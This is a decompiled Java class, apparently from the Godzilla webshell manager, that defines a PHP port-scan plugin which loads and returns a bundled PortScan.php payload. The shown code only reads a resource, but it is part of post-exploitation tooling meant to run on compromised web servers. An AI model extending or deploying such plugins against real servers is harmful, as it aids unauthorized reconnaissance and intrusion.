/*    */ package shells.plugins.php;
/*    */ 
/*    */ import core.annotation.PluginAnnotation;
/*    */ import java.io.IOException;
/*    */ import java.io.InputStream;
/*    */ import shells.plugins.generic.PortScan;
/*    */ import util.functions;
/*    */ 
/*    */ 
/*    */ @PluginAnnotation(payloadName = "PhpDynamicPayload", Name = "PortScan", DisplayName = "端口扫描")
/*    */ public class PPortScan
/*    */   extends PortScan
/*    */ {
/*    */   private static final String CLASS_NAME = "PortScan";
/*    */   
/*    */   public byte[] readPlugin() throws IOException {
/* 17 */     InputStream inputStream = getClass().getResourceAsStream(String.format("assets/%s.php", new Object[] { "PortScan" }));
/* 18 */     byte[] data = functions.readInputStream(inputStream);
/* 19 */     inputStream.close();
/* 20 */     return data;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getClassName() {
/* 25 */     return "PortScan";
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\php\PPortScan.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */